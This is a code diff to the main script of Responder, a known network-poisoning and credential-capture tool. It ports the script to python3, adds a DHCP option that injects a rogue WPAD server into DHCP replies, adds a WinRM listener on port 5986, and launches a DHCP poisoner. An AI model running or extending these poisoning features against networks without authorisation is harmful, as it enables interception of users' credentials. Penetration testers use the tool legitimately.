@@ -1,4 +1,4 @@
-#!/usr/bin/env python
+#!/usr/bin/env python3
 # This file is part of Responder, a network take-over set of tools 
 # created and maintained by Laurent Gaffie.
 # email: laurent.gaffie@gmail.com
@@ -31,10 +31,9 @@ parser.add_option('-I','--interface',      action="store",      help="Network in
 parser.add_option('-i','--ip',             action="store",      help="Local IP to use \033[1m\033[31m(only for OSX)\033[0m", dest="OURIP", metavar="10.0.0.21", default=None)
 
 parser.add_option('-e', "--externalip",    action="store",      help="Poison all requests with another IP address than Responder's one.", dest="ExternalIP",  metavar="10.0.0.22", default=None)
-
 parser.add_option('-b', '--basic',         action="store_true", help="Return a Basic HTTP authentication. Default: NTLM", dest="Basic", default=False)
 parser.add_option('-r', '--wredir',        action="store_true", help="Enable answers for netbios wredir suffix queries. Answering to wredir will likely break stuff on the network. Default: False", dest="Wredirect", default=False)
-parser.add_option('-d', '--NBTNSdomain',   action="store_true", help="Enable answers for netbios domain suffix queries. Answering to domain suffixes will likely break stuff on the network. Default: False", dest="NBTNSDomain", default=False)
+parser.add_option('-d', '--DHCP',          action="store_true", help="Enable answers for DHCP broadcast requests. This option will inject a WPAD server in the DHCP response. Default: False", dest="DHCP_On_Off", default=False)
 parser.add_option('-f','--fingerprint',    action="store_true", help="This option allows you to fingerprint a host that issued an NBT-NS or LLMNR query.", dest="Finger", default=False)
 parser.add_option('-w','--wpad',           action="store_true", help="Start the WPAD rogue proxy server. Default value is False", dest="WPAD_On_Off", default=False)
 parser.add_option('-u','--upstream-proxy', action="store",      help="Upstream HTTP proxy used by the rogue WPAD Proxy for outgoing requests (format: host:port)", dest="Upstream_Proxy", default=None)
@@ -50,7 +49,7 @@ options, args = parser.parse_args()
 if not os.geteuid() == 0:
     print(color("[!] Responder must be run as root."))
     sys.exit(-1)
-elif options.OURIP is None and IsOsX() is True:
+elif options.OURIP == None and IsOsX() == True:
     print("\n\033[1m\033[31mOSX detected, -i mandatory option is missing\033[0m\n")
     parser.print_help()
     exit(-1)
@@ -61,9 +60,6 @@ settings.Config.populate(options)
 StartupMessage()
 
 settings.Config.ExpandIPRanges()
-
-if settings.Config.AnalyzeMode:
-	print(color('[i] Responder is in analyze mode. No NBT-NS, LLMNR, MDNS requests will be poisoned.', 3, 1))
 
 #Create the DB, before we start Responder.
 CreateResponderDb()
@@ -267,6 +263,10 @@ def main():
 			from servers.WinRM import WinRM
 			threads.append(Thread(target=serve_thread_tcp, args=(settings.Config.Bind_To, 5985, WinRM,)))
 
+		if settings.Config.WinRM_On_Off:
+			from servers.WinRM import WinRM
+			threads.append(Thread(target=serve_thread_SSL, args=(settings.Config.Bind_To, 5986, WinRM,)))
+
 		if settings.Config.SSL_On_Off:
 			from servers.HTTP import HTTP
 			threads.append(Thread(target=serve_thread_SSL, args=(settings.Config.Bind_To, 443, HTTP,)))
@@ -339,7 +339,15 @@ def main():
 			thread.setDaemon(True)
 			thread.start()
 
+
 		print(color('\n[+]', 2, 1) + " Listening for events...\n")
+
+		if settings.Config.AnalyzeMode:
+			print(color('[+] Responder is in analyze mode. No NBT-NS, LLMNR, MDNS requests will be poisoned.', 3, 1))
+
+		if settings.Config.DHCP_On_Off:
+			from poisoners.DHCP import DHCP
+			DHCP()
 
 		while True:
 			time.sleep(1)
